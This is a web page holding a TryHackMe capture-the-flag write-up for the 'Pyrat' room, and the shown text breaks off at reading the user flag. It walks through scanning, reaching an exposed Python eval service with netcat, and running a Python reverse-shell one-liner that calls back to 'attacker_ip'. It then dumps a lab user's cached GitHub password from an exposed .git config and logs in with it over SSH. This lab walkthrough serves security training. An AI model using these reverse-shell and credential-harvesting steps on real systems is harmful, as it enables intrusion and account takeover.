@@ -1,0 +1,447 @@
+<!doctype html><html lang=en dir=ltr><head><title>Pyrat | THM Writeup :: CyberJagadeesh - Learn Cyber Security</title>
+<meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Introduction Detailed walkthroughs for Pyrat CTF challenges on TryHackMe .
+Description Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application&amp;rsquo;s older version."><meta name=keywords content="cyber security,penetration testing,ethical hacking,vulnerability assessment,network security,application security,web application security,security testing,red teaming,bug bounty,CTFs,cybersecurity challenges,hacking tutorials,security tools,exploit development,reverse engineering,penetration tester,security researcher,security analyst,information security,digital forensics,incident response,threat intelligence,security awareness,social engineering,phishing,malware analysis,cryptography,cloud security,IoT security,mobile security,how to become a penetration tester,penetration testing tools,CTF challenges for beginners,web application penetration testing,network penetration testing,exploit development tutorial,reverse engineering techniques,bug bounty hunting tips,security research projects,cyber security certifications"><meta name=robots content="noodp"><link rel=manifest href=/manifest.json><meta property="og:url" content="https://cyberjagadeesh.github.io/posts/pyrat/writeup/"><meta property="og:site_name" content="CyberJagadeesh"><meta property="og:title" content="Pyrat | THM Writeup"><meta property="og:description" content="Introduction Detailed walkthroughs for Pyrat CTF challenges on TryHackMe .
+Description Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application’s older version."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-10-07T20:28:01+05:30"><meta property="article:modified_time" content="2024-10-07T20:28:01+05:30"><meta property="article:tag" content="PythonJail"><meta property="article:tag" content="Git"><meta property="article:tag" content="Pyrat"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/thelondonbridge/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/cheesectf/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/breakme/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/certaindoom/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/chrome/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/u.a.highschool/writeup/"><meta name=twitter:card content="summary"><meta name=twitter:title content="Pyrat | THM Writeup"><meta name=twitter:description content="Introduction Detailed walkthroughs for Pyrat CTF challenges on TryHackMe .
+Description Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application’s older version."><link rel=canonical href=https://cyberjagadeesh.github.io/posts/pyrat/writeup/><link rel="shortcut icon" href=/favicon.ico><link rel=stylesheet href=/css/index.min.1f9b3e6594d41770030cc9cea67e9220cd9066bb33910ebfb19ea46cf6b4b50c.css><script async src="https://www.googletagmanager.com/gtag/js?id=G-376DY6PW0W"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-376DY6PW0W")}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"Article","author":{"@type":"Person","name":"CyberJagadeesh"},"dateModified":"2024-10-07T20:28:01+05:30","datePublished":"2024-10-07T20:28:01+05:30","description":"Introduction Detailed walkthroughs for Pyrat CTF challenges on TryHackMe .\nDescription Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application\u0026rsquo;s older version.","image":"/posts/pyrat/pyrat.png","name":"Pyrat | THM Writeup","url":"https://cyberjagadeesh.github.io/posts/pyrat/writeup/"}</script></head><body class="flex flex-col min-h-screen w-full bg-slate-50 dark:bg-gray-800"><header class="flex flex-none justify-center z-10"><div class="flex flex-row gap justify-between w-full max-w-4xl lg:max-w-5xl h-12 mt-3"><div class="flex-none ml-2 md:ml-0"><a href=/><img class="h-12 w-12 rounded-full object-cover bg-gray-100" src=/logo.png alt=logo></a></div><div class=flex-1></div><div class=flex-none><nav class="h-full static"><button id=navbar-menu-toggle type=button class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg md:hidden" aria-controls=navbar-menu aria-expanded=false>
+<span class=sr-only>Open main menu</span>
+<i class="w-8 h-8"><svg class="icon icon-tabler icon-tabler-menu-2" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 6h16"/><path d="M4 12h16"/><path d="M4 18h16"/></svg></i></button><div class="absolute md:static top-16 left-0 right-0 z-50 hidden w-full md:block md:w-auto" id=navbar-menu><ul class="flex flex-col mx-2 md:mx-0 md:flex-row md:border-0 rounded-sm md:rounded-full px-3 text-base font-medium text-slate-800 dark:text-slate-200 shadow-lg bg-white dark:bg-gray-600 shadow-slate-800/5 dark:shadow-slate-200/5 ring-1 ring-slate-900/5 dark:ring-slate-100/5"><li id=about><a class="block px-3 py-3 hover:text-emerald-600" href=/about/ title=About>About</a></li><li id=post><a class="block px-3 py-3 hover:text-emerald-600 text-emerald-600" href=/posts/ title=Post>Post</a></li></ul></div></nav></div><div class="flex-none mx-1"></div><div class="flex-none md:hidden"><a href=/search/ class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg" aria-controls=navbar-menu aria-expanded=false><span class=sr-only>Search</span>
+<i class="w-8 h-8"><svg class="icon icon-tabler icon-tabler-search" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1014 0A7 7 0 103 10"/><path d="M21 21l-6-6"/></svg></i></a></div><div class="darkmode-toggle flex flex-none mr-2 md:mr-0"><label for=darkmode-toggle class="flex items-center px-3 cursor-pointer rounded-full bg-gray-100 dark:bg-gray-600" title="Toggle dark mode"><input name=darkmode-toggle id=darkmode-toggle type=checkbox class="sr-only peer" aria-label="Toggle dark mode"><div class="group flex flex-row gap-1 justify-center h-8 px-1 rounded-full bg-white dark:bg-gray-700"><i class="h-6 w-6 flex-none rounded-full bg-yellow-400 place-self-center peer-checked:group-[]:invisible"><svg class="icon icon-tabler icon-tabler-brightness-down" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-3 0a3 3 0 106 0 3 3 0 10-6 0"/><path d="M12 5v.01"/><path d="M17 7v.01"/><path d="M19 12v.01"/><path d="M17 17v.01"/><path d="M12 19v.01"/><path d="M7 17v.01"/><path d="M5 12v.01"/><path d="M7 7v.01"/></svg>
+</i><i class="h-6 w-6 flex-none rounded-full place-self-center invisible peer-checked:group-[]:visible"><svg class="icon icon-tabler icon-tabler-moon-stars" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 3c.132.0.263.0.393.0a7.5 7.5.0 007.92 12.446A9 9 0 1112 2.992z"/><path d="M17 4a2 2 0 002 2 2 2 0 00-2 2 2 2 0 00-2-2 2 2 0 002-2"/><path d="M19 11h2m-1-1v2"/></svg></i></div></label></div></div></header><main class="flex flex-auto justify-center"><div class="w-full max-w-4xl lg:max-w-5xl"><div class="flex flex-col mt-6 mx-2 md:mx-0 rounded-lg overflow-hidden shadow-md bg-white dark:bg-gray-700"><div><a href=/posts/pyrat/writeup/><figure><img class="w-full object-cover h-36 md:h-48 xl:h-60" src=/posts/pyrat/pyrat.png alt="Pyrat | THM Writeup" title="Pyrat | THM Writeup" loading=lazy></figure></a></div><div class="flex flex-col gap-y-3 p-6"><h1 class="text-4xl font-semibold text-slate-800 dark:text-slate-100"><a href=/posts/pyrat/writeup/>Pyrat | THM Writeup</a></h1><ul class="flex flex-row flex-wrap text-slate-500 dark:text-slate-300"><li><a href=/categories/ctf/ class="text-sm mr-2 px-2 py-1 rounded border border-emerald-800 bg-emerald-800 text-slate-50">CTF</a></li><li><a href=/tags/pythonjail/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
+</i><span class=ml-0>PythonJail</span></a></li><li><a href=/tags/git/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
+</i><span class=ml-0>Git</span></a></li><li><a href=/tags/pyrat/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
+</i><span class=ml-0>Pyrat</span></a></li><li><a href=/series/tryhackme/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
+</i><span class=ml-0>Tryhackme</span></a></li><li><a href=/platforms/linux/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
+</i><span class=ml-0>Linux</span></a></li><li><a href=/levels/medium/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
+</i><span class=ml-0>Medium</span></a></li></ul><div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300"><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-calendar" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 7a2 2 0 012-2h12a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2V7z"/><path d="M16 3v4"/><path d="M8 3v4"/><path d="M4 11h16"/><path d="M11 15h1"/><path d="M12 15v3"/></svg>
+</i><time datetime=2024-10-07T20:28:01+05:30>2024-10-07</time></div><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-hourglass-high" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6.5 7h11"/><path d="M6 20v-2a6 6 0 1112 0v2a1 1 0 01-1 1H7a1 1 0 01-1-1z"/><path d="M6 4v2a6 6 0 1012 0V4a1 1 0 00-1-1H7A1 1 0 006 4z"/></svg>
+</i><span>9 minutes to read</span></div></div><section class="prose prose-slate dark:prose-invert w-full max-w-4xl lg:max-w-5xl mt-6"><h2>Table of Contents</h2><aside><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a><ul><li><a href=#description>Description</a></li></ul></li><li><a href=#shell-as-www-data>Shell as www-data</a></li><li><a href=#rustscan>Rustscan</a><ul><li><a href=#web-app>Web App</a></li><li><a href=#netcat>NetCat</a></li></ul></li><li><a href=#shell-as-think>Shell as think</a><ul><li><a href=#git>git</a></li></ul></li><li><a href=#privilege-escalation>Privilege Escalation</a></li><li><a href=#extras>Extras</a><ul><li><a href=#pyrat>Pyrat</a></li><li><a href=#linpeas>linpeas</a></li></ul></li></ul></nav></aside></section><article class="mt-6 w-full max-w-4xl lg:max-w-5xl prose prose-slate dark:prose-invert prose-quoteless post-content"><h2 id=introduction>Introduction</h2><p>Detailed walkthroughs for <a href=https://tryhackme.com/r/room/pyrat target=_blank rel=noopener>Pyrat</a>
+CTF challenges on <a href=https://tryhackme.com target=_blank rel=noopener>TryHackMe</a>
+.</p><h3 id=description>Description</h3><p>Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application&rsquo;s older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root.</p><h2 id=shell-as-www-data>Shell as www-data</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s2>&#34;10.10.125.9 pyrat.thm&#34;</span> &gt;&gt; /etc/hosts
+</span></span></code></pre></div><p>Mappped the ip to domain <code>pyrat.thm</code>.</p><h2 id=rustscan>Rustscan</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ rustscan -a pyrat.thm -- -sC -sV
+</span></span><span class=line><span class=cl>Open 10.10.125.9:22
+</span></span><span class=line><span class=cl>Open 10.10.125.9:8000
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>PORT     STATE SERVICE   REASON         VERSION
+</span></span><span class=line><span class=cl>22/tcp   open  ssh       syn-ack ttl <span class=m>60</span> OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 <span class=o>(</span>RSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMc4hLykriw3nBOsKHJK1Y6eauB8OllfLLlztbB4tu4c9cO8qyOXSfZaCcb92uq/Y3u02PPHWq2yXOLPler1AFGVhuSfIpokEnT2jgQzKL63uJMZtoFzL3RW8DAzunrHhi/nQqo8sw7wDCiIN9s4PDrAXmP6YXQ5ekK30om9kd5jHG6xJ+/gIThU4ODr/pHAqr28bSpuHQdgphSjmeShDMg8wu8Kk/B0bL2oEvVxaNNWYWc1qHzdgjV5HPtq6z3MEsLYzSiwxcjDJ+EnL564tJqej6R69mjII1uHStkrmewzpiYTBRdgi9A3Yb+x8NxervECFhUR2MoR1zD+0UJbRA2v1LQaGg9oYnYXNq3Lc5c4aXz638wAUtLtw2SwTvPxDrlCmDVtUhQFDhyFOu9bSmPY0oGH5To8niazWcTsCZlx2tpQLhF/gS3jP/fVw+H6Eyz/yge3RYeyTv3ehV6vXHAGuQLvkqhT6QS21PLzvM7bCqmo1YIqHfT2DLi7jZxdk<span class=o>=</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 <span class=o>(</span>ECDSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJNL/iO8JI5DrcvPDFlmqtX/lzemir7W+WegC7hpoYpkPES6q+0/p4B2CgDD0Xr1AgUmLkUhe2+mIJ9odtlWW30<span class=o>=</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb <span class=o>(</span>ED25519<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFG/Wi4PUTjReEdk2K4aFMi8WzesipJ0bp0iI0FM8AfE
+</span></span><span class=line><span class=cl>8000/tcp open  http-alt? syn-ack ttl <span class=m>60</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
+</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: GET POST OPTIONS
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-open-proxy: Proxy might be redirecting requests
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Site doesnt have a title <span class=o>(</span>text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>utf-8<span class=o>)</span>.
+</span></span><span class=line><span class=cl><span class=p>|</span> fingerprint-strings: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, LANDesk-RC, NotesRPC, Socks4, X11Probe, afp, giop: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nb>source</span> code string cannot contain null bytes
+</span></span><span class=line><span class=cl><span class=p>|</span>   FourOhFourRequest, LPDString, SIPOptions: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     invalid syntax <span class=o>(</span>&lt;string&gt;, line 1<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   GetRequest: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     name <span class=s1>&#39;GET&#39;</span> is not defined
+</span></span><span class=line><span class=cl><span class=p>|</span>   HTTPOptions, RTSPRequest: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     name <span class=s1>&#39;OPTIONS&#39;</span> is not defined
+</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><h3 id=web-app>Web App</h3><p><figure><img src=/posts/pyrat/1.png title=pyrat.thm:8000 style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>pyrat.thm:8000</strong></figcaption></figure>We got a simple page with response <code>Try a more basic connection!</code>. Here we can also notice that <code>SimpleHTTP/0.6 Python/3.11.2</code> is being used.</p><h3 id=netcat>NetCat</h3><p>By using the hint provided in the web page let&rsquo;s try to connect using different tools.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ nc pyrat.thm <span class=m>8000</span>
+</span></span><span class=line><span class=cl>help<span class=o>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Welcome to Python 3.8<span class=s1>&#39;s help utility!
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>If this is your first time using Python, you should definitely check out
+</span></span></span><span class=line><span class=cl><span class=s1>the tutorial on the Internet at https://docs.python.org/3.8/tutorial/.
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>Enter the name of any module, keyword, or topic to get help on writing
+</span></span></span><span class=line><span class=cl><span class=s1>Python programs and using Python modules.  To quit this help utility and
+</span></span></span><span class=line><span class=cl><span class=s1>return to the interpreter, just type &#34;quit&#34;.
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>To get a list of available modules, keywords, symbols, or topics, type
+</span></span></span><span class=line><span class=cl><span class=s1>&#34;modules&#34;, &#34;keywords&#34;, &#34;symbols&#34;, or &#34;topics&#34;.  Each module also comes
+</span></span></span><span class=line><span class=cl><span class=s1>with a one-line summary of what it does; to list the modules whose name
+</span></span></span><span class=line><span class=cl><span class=s1>or summary contain a given string such as &#34;spam&#34;, type &#34;modules spam&#34;.
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>help&gt; 
+</span></span></span><span class=line><span class=cl><span class=s1>You are now leaving help and returning to the Python interpreter.
+</span></span></span><span class=line><span class=cl><span class=s1>If you want to ask for help on a particular object directly from the
+</span></span></span><span class=line><span class=cl><span class=s1>interpreter, you can type &#34;help(object)&#34;.  Executing &#34;help(&#39;</span>string<span class=err>&#39;</span><span class=o>)</span><span class=s2>&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>has the same effect as typing a particular string at the help&gt; prompt.
+</span></span></span></code></pre></div><p>When tried to connect using <code>nc</code>, we established the connection. And by executing different command keywords, found that we are inside a <code>python shell</code>. Lets get reverse shell from python shell.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>import socket,subprocess,os<span class=p>;</span><span class=nv>s</span><span class=o>=</span>socket.socket<span class=o>(</span>socket.AF_INET,socket.SOCK_STREAM<span class=o>)</span><span class=p>;</span>s.connect<span class=o>((</span><span class=s2>&#34;attacker_ip&#34;</span>,1234<span class=o>))</span><span class=p>;</span>os.dup2<span class=o>(</span>s.fileno<span class=o>()</span>,0<span class=o>)</span><span class=p>;</span> os.dup2<span class=o>(</span>s.fileno<span class=o>()</span>,1<span class=o>)</span><span class=p>;</span>os.dup2<span class=o>(</span>s.fileno<span class=o>()</span>,2<span class=o>)</span><span class=p>;</span>import pty<span class=p>;</span> pty.spawn<span class=o>(</span><span class=s2>&#34;bash&#34;</span><span class=o>)</span>
+</span></span></code></pre></div><p>Lets use the above reverse shell command. Make sure to have listener, for my case its <code>port 1234</code>.</p><p>By executing the above command, we got <code>reverse shell</code> as <code>www-data</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 -c <span class=s1>&#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
+</span></span><span class=line><span class=cl>^Z <span class=c1>#(Ctrl+Z)</span>
+</span></span><span class=line><span class=cl>stty raw -echo <span class=o>&amp;&amp;</span> <span class=nb>fg</span>
+</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
+</span></span></code></pre></div><p>Got stable shell by running above commands.</p><h2 id=shell-as-think>Shell as think</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ grep bash /etc/passwd
+</span></span><span class=line><span class=cl>root:x:0:0:root:/root:/bin/bash
+</span></span><span class=line><span class=cl>think:x:1000:1000:,,,:/home/think:/bin/bash
+</span></span></code></pre></div><p>We found an user <code>think</code> and <code>root</code> on the system .</p><h3 id=git>git</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ find / -user think 2&gt;/dev/null
+</span></span><span class=line><span class=cl>/opt/dev
+</span></span><span class=line><span class=cl>/opt/dev/.git
+</span></span><span class=line><span class=cl>/opt/dev/.git/objects                                                                                                                                        
+</span></span><span class=line><span class=cl>/opt/dev/.git/objects/info                                                                                                                                   
+</span></span><span class=line><span class=cl>/opt/dev/.git/objects/0a                                                                                                                                     
+</span></span><span class=line><span class=cl>/opt/dev/.git/objects/0a/3c36d66369fd4b07ddca72e5379461a63470bf                                                                                              
+</span></span><span class=line><span class=cl>/opt/dev/.git/objects/pack                                                                                                                                   
+</span></span><span class=line><span class=cl>/opt/dev/.git/objects/ce                                                                                                                                     
+</span></span><span class=line><span class=cl>/opt/dev/.git/objects/ce/425cfd98c0a413205764cb1f341ae2b5766928
+</span></span><span class=line><span class=cl>/opt/dev/.git/objects/56
+</span></span><span class=line><span class=cl>/opt/dev/.git/objects/56/110f327a3265dd1dcae9454c35f209c8131e26
+</span></span><span class=line><span class=cl>/opt/dev/.git/COMMIT_EDITMSG
+</span></span><span class=line><span class=cl>/opt/dev/.git/HEAD
+</span></span><span class=line><span class=cl>/opt/dev/.git/description
+</span></span><span class=line><span class=cl>/opt/dev/.git/hooks
+</span></span><span class=line><span class=cl>/opt/dev/.git/hooks/pre-receive.sample
+</span></span><span class=line><span class=cl>/opt/dev/.git/hooks/update.sample
+</span></span><span class=line><span class=cl>/opt/dev/.git/hooks/post-update.sample
+</span></span><span class=line><span class=cl>/opt/dev/.git/hooks/pre-applypatch.sample
+</span></span><span class=line><span class=cl>/opt/dev/.git/hooks/pre-commit.sample
+</span></span><span class=line><span class=cl>/opt/dev/.git/hooks/pre-merge-commit.sample
+</span></span><span class=line><span class=cl>/opt/dev/.git/hooks/prepare-commit-msg.sample
+</span></span><span class=line><span class=cl>/opt/dev/.git/hooks/applypatch-msg.sample
+</span></span><span class=line><span class=cl>/opt/dev/.git/hooks/fsmonitor-watchman.sample
+</span></span><span class=line><span class=cl>/opt/dev/.git/hooks/commit-msg.sample
+</span></span><span class=line><span class=cl>/opt/dev/.git/hooks/pre-rebase.sample
+</span></span><span class=line><span class=cl>/opt/dev/.git/hooks/pre-push.sample
+</span></span><span class=line><span class=cl>/opt/dev/.git/config
+</span></span><span class=line><span class=cl>/opt/dev/.git/info
+</span></span><span class=line><span class=cl>/opt/dev/.git/info/exclude
+</span></span><span class=line><span class=cl>/opt/dev/.git/logs
+</span></span><span class=line><span class=cl>/opt/dev/.git/logs/HEAD
+</span></span><span class=line><span class=cl>/opt/dev/.git/logs/refs
+</span></span><span class=line><span class=cl>/opt/dev/.git/logs/refs/heads
+</span></span><span class=line><span class=cl>/opt/dev/.git/logs/refs/heads/master
+</span></span><span class=line><span class=cl>/opt/dev/.git/branches
+</span></span><span class=line><span class=cl>/opt/dev/.git/refs
+</span></span><span class=line><span class=cl>/opt/dev/.git/refs/heads
+</span></span><span class=line><span class=cl>/opt/dev/.git/refs/heads/master
+</span></span><span class=line><span class=cl>/opt/dev/.git/refs/tags
+</span></span><span class=line><span class=cl>/opt/dev/.git/index
+</span></span><span class=line><span class=cl>/home/think
+</span></span></code></pre></div><p>We found that git is used in the system by user <code>think</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 -m http.server <span class=m>8080</span>
+</span></span></code></pre></div><p>Setting up listener in targert machine in <code>/opt/dev/</code> directory.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mkdir .git <span class=o>&amp;&amp;</span> <span class=nb>cd</span> .git
+</span></span><span class=line><span class=cl>wget -r -np -nH --cut-dirs<span class=o>=</span><span class=m>1</span> http://pyrat.thm:8080/.git/
+</span></span></code></pre></div><p>Getting files in our local machine to investigate data in git.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ git config --list                                                                                                                                        
+</span></span><span class=line><span class=cl>core.repositoryformatversion<span class=o>=</span><span class=m>0</span>
+</span></span><span class=line><span class=cl>core.filemode<span class=o>=</span><span class=nb>true</span>
+</span></span><span class=line><span class=cl>core.bare<span class=o>=</span><span class=nb>false</span>
+</span></span><span class=line><span class=cl>core.logallrefupdates<span class=o>=</span><span class=nb>true</span>
+</span></span><span class=line><span class=cl>user.name<span class=o>=</span>Jose Mario
+</span></span><span class=line><span class=cl>user.email<span class=o>=</span>josemlwdf@github.com
+</span></span><span class=line><span class=cl>credential.helper<span class=o>=</span>cache --timeout<span class=o>=</span><span class=m>3600</span>
+</span></span><span class=line><span class=cl>credential.https://github.com.username<span class=o>=</span>think
+</span></span><span class=line><span class=cl>credential.https://github.com.password<span class=o>=</span>_TH1NKINGPirate<span class=nv>$_</span>
+</span></span></code></pre></div><p>Dumped git credentials of <code>think</code>. Lets try to ssh using the above credentials.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ssh think@pyrat.thm 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>think@Pyrat:~$ id
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>think<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>think<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>think<span class=o>)</span>
+</span></span></code></pre></div><p>We got connected to the machine as user <code>think</code> using <code>github credentials</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>think@Pyrat:~$ cat /home/think/user.txt
